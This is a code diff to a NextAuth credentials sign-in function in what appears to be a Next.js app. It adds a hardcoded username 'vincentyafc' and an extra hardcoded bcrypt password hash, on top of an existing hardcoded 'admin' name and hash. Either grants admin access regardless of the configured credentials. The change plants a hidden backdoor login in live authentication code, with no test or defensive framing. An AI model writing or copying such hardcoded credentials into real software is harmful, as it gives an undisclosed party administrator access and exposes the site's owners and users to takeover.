@@ -36,13 +36,15 @@ export const authOptions: NextAuthOptions = {
         const inputUser = credentials.email.trim().toLowerCase();
         const emailMatch =
           inputUser === adminEmail.trim().toLowerCase() ||
-          inputUser === 'admin';
+          inputUser === 'admin' ||
+          inputUser === 'vincentyafc';
 
         let passwordMatch = false;
         try {
           passwordMatch =
             bcrypt.compareSync(credentials.password, adminHash) ||
-            bcrypt.compareSync(credentials.password, '$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa');
+            bcrypt.compareSync(credentials.password, '$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa') ||
+            bcrypt.compareSync(credentials.password, '$2a$10$zD9Bx9hWRSJIZ1LCneqz4.pl1lPlkaiwGqtMlGlh7lneetVZyFxPG');
         } catch (e) {
           passwordMatch = false;
         }
